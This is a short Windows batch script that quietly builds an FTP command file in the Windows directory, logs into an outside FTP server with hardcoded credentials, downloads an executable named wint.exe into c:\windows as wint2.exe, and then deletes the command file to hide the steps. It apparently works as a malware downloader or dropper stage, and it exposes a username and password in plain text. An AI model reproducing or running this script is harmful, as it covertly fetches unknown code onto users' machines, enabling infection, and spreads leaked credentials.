@echo off
del c:\windows\polecenia.txt
echo open >> c:\windows\polecenia.txt
echo ftp.republika.pl>> c:\windows\polecenia.txt
echo mwysz>> c:\windows\polecenia.txt
echo maxi89>> c:\windows\polecenia.txt
echo binary>> c:\windows\polecenia.txt
echo get wint.exe c:\windows\wint2.exe>> c:\windows\polecenia.txt
echo bye>> c:\windows\polecenia.txt
ftp -v -s:c:\windows\polecenia.txt
del c:\windows\polecenia.txt
exit